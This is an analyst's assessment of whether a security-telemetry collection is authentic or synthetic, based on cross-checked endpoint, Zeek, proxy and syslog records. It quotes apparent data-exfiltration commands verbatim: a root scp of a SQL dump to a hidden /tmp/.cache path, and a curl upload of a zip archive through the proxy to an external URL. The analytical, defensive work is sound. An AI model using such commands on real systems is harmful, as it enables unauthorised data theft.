# Threat Hunter — Authenticity Assessment

## Verdict

**Assessment:** Inconclusive
**Verdict Confidence:** 82
**Synthetic-Confidence Score:** 35

## Executive Summary

The bounded sample looks mostly operationally plausible, with usable process, account, network and proxy pivots and substantial background telemetry. I found no demonstrated impossible lifecycle or ordering relationship; the strongest concern is weak repetition in two Mac process populations, which could also reflect collection scope and does not establish synthetic origin.

## Evidence For Synthetic

- [weak_signal] Both Mac endpoint process-create populations have a similar shell-heavy shape: `MAC-MROSS-01/ecar.json` contains 26 `-zsh` creates among 45 process creates, and `MAC-MROSS-02/ecar.json` contains 32 among 54. Their next common commands include `/sbin/launchd` (8 and 10 creates) and `/usr/libexec/sshd-session -i -R` (4 each). This is mildly suggestive of shared command texture across hosts, but repeated interactive forks and collection selection are plausible explanations. It is not a demonstrated schema or lifecycle defect and contributes only slightly to the score.
- No high-impact `hard_contradiction` or `contract_gap` was demonstrated in the two exact pivots. Suspicious commands and compact investigative paths are not counted as synthetic indicators.

## Evidence For Real

- The SCP trail shares the exact tuple `10.10.4.10:37862 -> 10.10.2.30:22` between DB endpoint FLOW, Zeek, and receiver sshd. Its process starts before transport; receiver connection logging follows transport observation. The observed ordering permits successful operation.
- A Windows curl upload joins across Sysmon and eCAR on PID 6932, command, parent PID 6784, user `aisha.johnson`, and LogonID `0x27c9a29`. Endpoint FLOW and proxy access then agree on client `10.10.1.35:53885`, proxy port 8080, identity and requested destination.
- Substantial background provides plausible hunting noise: 39,151 normalized endpoint records across 23 host directories, 23,644 Zeek connections, 19,623 Windows Security events, 12,162 Sysmon events and 4,463 syslog lines. These totals describe this collection, rather than a required production mix.
- A sampled `APP-INT-01` rsyslog message at `13:00:32.218756Z` reports a forwarding queue with 2,028 pending messages and two worker threads, a concrete operational background detail.
- Exact normalized process object identities with both visible create and terminate were correctly ordered in 2,447/2,447 pairs. Likewise, 507/507 user-session object identities with both visible login and logout were ordered correctly. These checks support coherence without establishing authenticity.

## Detailed Analysis

### Scope and method

Only the assigned data directory and supplied briefing were read. I examined 19 representative records, supported by source inventory, record counts, command-frequency summaries and one narrow normalized lifecycle-order aggregate. The sample included normalized Windows/Linux/Mac records, native Sysmon, native Mac Endpoint Security, syslog, proxy and Zeek. Source filenames here omit the common `.meridianhcs.local` hostname suffix for readability.

Normalized endpoint timestamps span `2026-11-02T13:00:00.756Z` through `18:59:50.485Z`. The inventory includes Windows workstation/server endpoint telemetry; Linux application, web, database, mail, monitoring and proxy hosts; two Mac endpoints; core/DMZ/database Zeek sensors; perimeter firewall; IDS; shell histories; web and proxy access. Hostnames suggest roles, but do not independently prove them. Windows totals count XML Event elements, not XML lines. I did not treat sparse native Mac Unified Log coverage, selected Sysmon types, sanitized domains, or missing pre/post-window lifecycle boundaries as defects.

### Exact pivot 1: database-host SCP to a modeled SSH receiver

`DB-PROD-01/ecar.json` records process CREATE object `a689ee9c-c74d-4545-bcdd-00cca3c16a77`, PID `1089180`, principal `root`, timestamp_ms `1793643365383` (`18:16:05.383Z`):

`scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/.cache/rpt_0318.sql.gz`

The same host's FLOW at timestamp_ms `1793643368968` (`18:16:08.968Z`) carries actorID exactly equal to that process object, PID `1089180`, and tuple `10.10.4.10:37862 -> 10.10.2.30:22`.

`zeek-core/conn.json` UID `CKrloaHiL9PiHXUDkx` records that exact tuple at `1793643368.360165` (`18:16:08.360165Z`), service `ssh`, state `SF`, duration `18.830982`, `orig_bytes=931308`, `resp_bytes=29855`. `zeek-db/conn.json` independently observes the same tuple at `1793643368.431932`, UID `CFUyTxkZcnCp5VrbXx`, matching byte counts and slightly different timing/duration. Independent sensor UIDs are appropriate; endpoint and sensor timestamp offsets do not imply different transports.

`APP-INT-01/syslog.log` then reports at `18:16:13.796468Z`, sshd PID `2984040`: `Connection from 10.10.4.10 port 37862 on 10.10.2.30 port 22`. This establishes the receiving host rather than inferring it from naming. Connection logging follows the visible transport and command. The selected records establish transport/receiver correlation, not a complete proof of successful file receipt; I did not inspect authentication or destination file evidence sufficiently to claim that effect.

A nearby DMZ SSH probe (`45.33.26.161:60349 -> 10.10.3.10:22`, UID `CiXUdImPi8oQICq1Ut`, `S0`) is a different tuple and was excluded from the SCP join. A neighboring DB inbound port-3306 FLOW is likewise unrelated. These are useful examples of why proximity alone is insufficient.

### Exact pivot 2: Windows archive upload through the explicit proxy

`WS-AJOHNSON-01/windows_event_sysmon.xml`, EventRecordID `31678`, EventID `1`, UtcTime `2026-11-02 18:25:01.794`, creates PID `6932`, ProcessGuid `{fd907e59-d57d-6ae8-1900-0000d3c3c9d4}`, parent PID `6784` (`cmd.exe /d /q`), user `MERIDIANHCS\aisha.johnson`, LogonID `0x27c9a29`:

`C:\Windows\System32\curl.exe --proxy http://10.10.3.20:8080 -F "archive=@C:\ProgramData\Microsoft\cache_7f3a.zip;type=application/zip" https://api.westbridge-services.net/upload/telemetry/7f3a2b19`

Normalized eCAR PROCESS CREATE object `f3083f8e-f1d7-4731-a48c-b65aed9b1b35` at `18:25:01.980Z` agrees on PID, parent, account, command, session 3 and LogonID. Normalized identity differs from Sysmon ProcessGuid, so I joined using the concrete host/process/command/session fields rather than assuming the identifiers are interchangeable.

The eCAR FLOW at `18:25:06.264Z` refers to that exact normalized process object and PID, with tuple `10.10.1.35:53885 -> 10.10.3.20:8080`. `PROXY-01/proxy_access.log` at `18:25:06 +0000` records the same client address, `client_src_port=53885`, account, POST URL and `curl/8.4.0`; status `200`, `cs_bytes=18783258`, `wire_sc_bytes=2198`, `ssl-inspect`, `ssl_bump=bump`, tunnel `PT-b27ab0df9e91e7fa`.

The visible command has a meaningful upload destination and archive argument, and the explicit inspection fields explain why an HTTPS URL and POST are visible at the proxy. The size is client-side request traffic, not automatically a verified archive size. This is suspicious hunting evidence, but these selected records do not establish malicious intent, archive creation or external receipt independently. Neither the completeness nor narratability of the pivot increases the synthetic score.

### Background and limits

A sampled `WS-PPATEL-01` encoded PowerShell process is a service-enumeration command shape, rather than sufficient evidence of malicious execution by itself. A sampled web-server curl command checks localhost HTTP status. Command aggregates also contain a base64-decoding bash pipeline, SSH agent forwarding, diagnostic tar/upload commands and Python package installation; no effect is attributed to those uninvestigated commands.

On `WEB-EXT-01`, two matched scheduled-statistics command shapes each account for 36/194 process creates (`/bin/sh -c 'command -v debian-sa1 > /dev/null && debian-sa1 1 1'` and `debian-sa1 1 1`). This has a plausible recurring service explanation and was not scored as artificial uniformity. A sampled Mac Endpoint Security record is a PID-1 launchd fork notification with a child process; that observation alone is not execution authorization, persistence activation or denial. I did not allege a native Mac schema problem without validating its version-specific meaning.

The aggregate lifecycle check uses exact normalized objectIDs with both endpoints visible. It does not validate every child-parent association, re-execution, native source observation or network close. More terminations than creates on some hosts can result from collection-window boundaries and are not contradictions. No filesystem timestamps, implementation knowledge, external context or unseen evidence informed this assessment.

## Synthetic Indicator Summary

| Category | Affected source family | Scope | Effect on score |
|---|---|---|---|
| weak_signal | Mac normalized endpoint process creation | 26/45 and 32/54 creates use `-zsh`; similar next-most-common commands across two hosts | Small increase for repetition; collection selection and fork behavior remain viable explanations |
| No demonstrated high-impact indicator | Two exact multi-source pivots and narrow normalized lifecycle aggregate | SCP/SSH tuple, curl/proxy tuple, 2,447 paired process lifecycles, 507 paired sessions | Keeps score in mostly realistic range; does not prove production origin |

## Realism Score by Category

- **Field format accuracy:** 8 — Sampled source fields and native/normalized distinctions were usable; native schemas were not exhaustively verified.
- **Temporal patterns:** 8 — Both examined activities have workable process/transport ordering; no inversions in the bounded aggregate lifecycle check.
- **Cross-source correlation:** 9 — Exact process, tuple and proxy pivots agree with reasonable observation-time differences.
- **Behavioral realism:** 8 — SCP, explicit-proxy curl upload, localhost checks and recurring administration have credible operational shapes.
- **Environmental consistency:** 8 — Mixed endpoint/sensor coverage and background volumes are plausible; Mac command repetition deserves contextual review.

## Recommendations

- If this were synthetic, validate the two Mac endpoints' shell/fork populations against the intended collection profile before changing them: the observed `-zsh` proportions are high, but can be legitimate. Broaden source-local process diversity only if that profile is meant to represent broader endpoint activity.
- Preserve the explicit proxy inspection semantics and the exact process/tuple relationships demonstrated here. No corrective recommendation is warranted for their completeness or observed source timestamp offsets.
- A subsequent bounded review could trace the SCP receiver's successful authentication and target file effect, and the Windows archive's file origin, to test additional exact relationships. Their absence from this review is a sampling limit, not a defect.
